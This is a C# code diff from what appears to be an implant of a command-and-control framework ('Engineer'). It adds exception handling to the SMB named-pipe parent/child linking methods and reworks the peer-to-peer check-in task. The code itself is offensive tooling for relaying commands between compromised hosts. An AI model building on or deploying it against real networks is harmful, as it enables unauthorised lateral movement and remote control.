@@ -99,158 +99,193 @@ namespace Engineer.Models
 
         public async Task Start_ParentServer()
         {
-            //make an NamedPipe server and wait for a client connection
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
-            Console.WriteLine($"starting server on named pipe {NamedPipe}");
-            Link.Output = $"starting server on named pipe {NamedPipe}";
-            while (!_tokenSource.Token.IsCancellationRequested)
+            try
             {
-                pipeServer.WaitForConnection();
-                //if pipeserver client is connected, start 2 Task.Runs one reading and one writing to the client 
-                byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
-                byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
-                byte[] IdSleep = Id.Concat(Sleep).ToArray();
-                await pipeServer.WriteAsync(IdSleep, 0, IdSleep.Length);
-                byte[] ChildId = new byte[36];
-                await pipeServer.ReadAsync(ChildId,0,36);
-                ChildIdString = Encoding.ASCII.GetString(ChildId);
-                Program.SmbChildCommModules.TryAdd(ChildIdString, this);
-                ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
-                var readPipeTask =  Task.Run(async () => await ReadFromPipe(pipeServer));
-                var writePipeTask = Task.Run(async () => await WriteToPipe(pipeServer));
-                // block whilst tasks are running
-                await Task.WhenAll(readPipeTask, writePipeTask);
+                //make an NamedPipe server and wait for a client connection
+                NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
+                Console.WriteLine($"starting server on named pipe {NamedPipe}");
+                Link.Output = $"starting server on named pipe {NamedPipe}";
+                while (!_tokenSource.Token.IsCancellationRequested)
+                {
+                    pipeServer.WaitForConnection();
+                    //if pipeserver client is connected, start 2 Task.Runs one reading and one writing to the client 
+                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
+                    byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
+                    byte[] IdSleep = Id.Concat(Sleep).ToArray();
+                    await pipeServer.WriteAsync(IdSleep, 0, IdSleep.Length);
+                    byte[] ChildId = new byte[36];
+                    await pipeServer.ReadAsync(ChildId,0,36);
+                    ChildIdString = Encoding.ASCII.GetString(ChildId);
+                    Program.SmbChildCommModules.TryAdd(ChildIdString, this);
+                    ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
+                    var readPipeTask =  Task.Run(async () => await ReadFromPipe(pipeServer));
+                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeServer));
+                    // block whilst tasks are running
+                    await Task.WhenAll(readPipeTask, writePipeTask);
+                }
             }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
+            }
+            
             Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
         public async Task Start_ParentClient()
         {
-            NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
-            Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
-            pipeClient.Connect(10000);
-            if (pipeClient.IsConnected)
+            try
             {
-                Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
-                Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
-                //if pipeserver client is connected, start 2 Task.Runs one reading and one writing to the client 
-                byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
-                byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
-                byte[] IdSleep = Id.Concat(Sleep).ToArray();
-                Console.WriteLine($"sending {IdSleep.Length} bytes");
-                await pipeClient.WriteAsync(IdSleep, 0, IdSleep.Length);
-                byte[] ChildId = new byte[36];
-                await pipeClient.ReadAsync(ChildId, 0, 36);
-                ChildIdString = Encoding.ASCII.GetString(ChildId);
-                Console.WriteLine($"got back child id {ChildIdString}");
-                Program.SmbChildCommModules.TryAdd(ChildIdString, this);
-                ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
-                var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeClient));
-                var writePipeTask = Task.Run(async () => await WriteToPipe(pipeClient));
-                // block whilst tasks are running
-                await Task.WhenAll(readPipeTask, writePipeTask);
+                NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
+                Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
+                pipeClient.Connect(10000);
+                if (pipeClient.IsConnected)
+                {
+                    Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
+                    Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
+                    //if pipeserver client is connected, start 2 Task.Runs one reading and one writing to the client 
+                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
+                    byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
+                    byte[] IdSleep = Id.Concat(Sleep).ToArray();
+                    Console.WriteLine($"sending {IdSleep.Length} bytes");
+                    await pipeClient.WriteAsync(IdSleep, 0, IdSleep.Length);
+                    byte[] ChildId = new byte[36];
+                    await pipeClient.ReadAsync(ChildId, 0, 36);
+                    ChildIdString = Encoding.ASCII.GetString(ChildId);
+                    Console.WriteLine($"got back child id {ChildIdString}");
+                    Program.SmbChildCommModules.TryAdd(ChildIdString, this);
+                    ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
+                    var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeClient));
+                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeClient));
+                    // block whilst tasks are running
+                    await Task.WhenAll(readPipeTask, writePipeTask);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
             }
             Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
         public async Task Start_ChildServer()
         {
-            //make an NamedPipe server and wait for a client connection
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
-            Console.WriteLine($"starting server on named pipe {NamedPipe}");
-            Link.Output = $"starting server on named pipe {NamedPipe}";
-            pipeServer.WaitForConnection();
-            while (!_tokenSource.Token.IsCancellationRequested)
+            try
             {
-                byte[] ParentIdSleep = new byte[40];
-                await pipeServer.ReadAsync(ParentIdSleep, 0, 40);
-                byte[] ParentId = ParentIdSleep.Take(36).ToArray();
-                byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
-                string ParentIdString = Encoding.ASCII.GetString(ParentId);
-                Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
-                Console.WriteLine($"got back parent id {ParentIdString}");
-                EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
-                Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
-                if(Program.SmbParentCommModules.TryAdd(ParentIdString, this))
+                //make an NamedPipe server and wait for a client connection
+                NamedPipeServerStream pipeServer = new NamedPipeServerStream(NamedPipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
+                Console.WriteLine($"starting server on named pipe {NamedPipe}");
+                Link.Output = $"starting server on named pipe {NamedPipe}";
+                pipeServer.WaitForConnection();
+                while (!_tokenSource.Token.IsCancellationRequested)
                 {
-                    Console.WriteLine("added parent id to the smb Parent comm moudle list");
+                    byte[] ParentIdSleep = new byte[40];
+                    await pipeServer.ReadAsync(ParentIdSleep, 0, 40);
+                    byte[] ParentId = ParentIdSleep.Take(36).ToArray();
+                    byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
+                    string ParentIdString = Encoding.ASCII.GetString(ParentId);
+                    Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
+                    Console.WriteLine($"got back parent id {ParentIdString}");
+                    EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
+                    Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
+                    if(Program.SmbParentCommModules.TryAdd(ParentIdString, this))
+                    {
+                        Console.WriteLine("added parent id to the smb Parent comm moudle list");
+                    }
+                    ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
+                    var firstCheckTask = new EngineerTask
+                    {
+                        Id = Guid.NewGuid().ToString(),
+                        Command = "P2PFirstTimeCheckIn",
+                        Arguments = new Dictionary<string, string> {
+                                { "/parentid", ParentIdString }
+                            },
+                        IsBlocking = true
+                    };
+                    Program.InboundCommandsRec += 1;
+                    await Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
+                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
+                    await pipeServer.WriteAsync(Id, 0, Id.Length);
+                    var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeServer));
+                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeServer));
+                    // block whilst tasks are running
+                    if (pipeServer.IsConnected)
+                    {
+                        IsChildConnectedToParent = true;
+                    }
+                    else if (!pipeServer.IsConnected)
+                    {
+                        IsChildConnectedToParent = false;
+                    }
+                    await Task.WhenAll(readPipeTask, writePipeTask);
                 }
-                ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
-                var firstCheckTask = new EngineerTask
-                {
-                    Id = "P2PFirstTimeCheckIn",
-                    Command = "firstcheckIn",
-                    Arguments = new Dictionary<string, string> {
-                            { "/parentid", ParentIdString }
-                        },
-                    IsBlocking = false
-                };
-                Program.InboundCommandsRec += 1;
-                Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
-                byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
-                await pipeServer.WriteAsync(Id, 0, Id.Length);
-                var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeServer));
-                var writePipeTask = Task.Run(async () => await WriteToPipe(pipeServer));
-                // block whilst tasks are running
-                if (pipeServer.IsConnected)
-                {
-                    IsChildConnectedToParent = true;
-                }
-                else if (!pipeServer.IsConnected)
-                {
-                    IsChildConnectedToParent = false;
-                }
-                await Task.WhenAll(readPipeTask, writePipeTask);
             }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
+            }
+            
             Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
         public async Task Start_ChildClient()
         {
-            NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
-            Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
-            pipeClient.Connect(10000);
-            if (pipeClient.IsConnected)
+            try
             {
-                Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
-                Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
-                byte[] ParentIdSleep = new byte[40];
-                await pipeClient.ReadAsync(ParentIdSleep,0,40);
-                byte[] ParentId = ParentIdSleep.Take(36).ToArray();
-                byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
-                string ParentIdString = Encoding.ASCII.GetString(ParentId);
-                Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
-                Console.WriteLine($"got back parent id {ParentIdString}");
-                EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
-                Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
-                Program.SmbParentCommModules.TryAdd(ParentIdString, this);
-                ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
-                var firstCheckTask = new EngineerTask
-                {
-                    Id = "P2PFirstTimeCheckIn",
-                    Command = "firstcheckIn",
-                    Arguments = new Dictionary<string, string> {
-                            { "/parentid", ParentIdString }
-                        },
-                    IsBlocking = false
-                };
-                Program.InboundCommandsRec += 1;
-                Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
-                byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
-                await pipeClient.WriteAsync(Id, 0, Id.Length);
-                var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeClient));
-                var writePipeTask = Task.Run(async () => await WriteToPipe(pipeClient));
-                // block whilst tasks are running
+                NamedPipeClientStream pipeClient = new NamedPipeClientStream(Bindip.ToString(), NamedPipe, PipeDirection.InOut, PipeOptions.Asynchronous);
+                Console.WriteLine($"trying to connect to {Bindip} on named pipe {NamedPipe}");
+                pipeClient.Connect(10000);
                 if (pipeClient.IsConnected)
                 {
-                    IsChildConnectedToParent = true;
+                    Console.WriteLine($"connected to {Bindip} on named pipe {NamedPipe}");
+                    Link.Output = $"connected to {Bindip} on named pipe {NamedPipe}";
+                    byte[] ParentIdSleep = new byte[40];
+                    await pipeClient.ReadAsync(ParentIdSleep,0,40);
+                    byte[] ParentId = ParentIdSleep.Take(36).ToArray();
+                    byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
+                    string ParentIdString = Encoding.ASCII.GetString(ParentId);
+                    Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
+                    Console.WriteLine($"got back parent id {ParentIdString}");
+                    EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
+                    Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
+                    Program.SmbParentCommModules.TryAdd(ParentIdString, this);
+                    ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
+                    var firstCheckTask = new EngineerTask
+                    {
+                        Id = Guid.NewGuid().ToString(),
+                        Command = "P2PFirstTimeCheckIn",
+                        Arguments = new Dictionary<string, string> {
+                                { "/parentid", ParentIdString }
+                            },
+                        IsBlocking = true
+                    };
+                    Program.InboundCommandsRec += 1;
+                    Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
+                    byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
+                    await pipeClient.WriteAsync(Id, 0, Id.Length);
+                    var readPipeTask = Task.Run(async () => await ReadFromPipe(pipeClient));
+                    var writePipeTask = Task.Run(async () => await WriteToPipe(pipeClient));
+                    // block whilst tasks are running
+                    if (pipeClient.IsConnected)
+                    {
+                        IsChildConnectedToParent = true;
+                    }
+                    else if (!pipeClient.IsConnected)
+                    {
+                        IsChildConnectedToParent = false;
+                    }
+                    await Task.WhenAll(readPipeTask, writePipeTask);
                 }
-                else if (!pipeClient.IsConnected)
-                {
-                    IsChildConnectedToParent = false;
-                }
-                await Task.WhenAll(readPipeTask, writePipeTask);
             }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+                Console.WriteLine(e.StackTrace);
+            }
+            
             Console.WriteLine("THIS SHOULD NOT PRINT");
         }
 
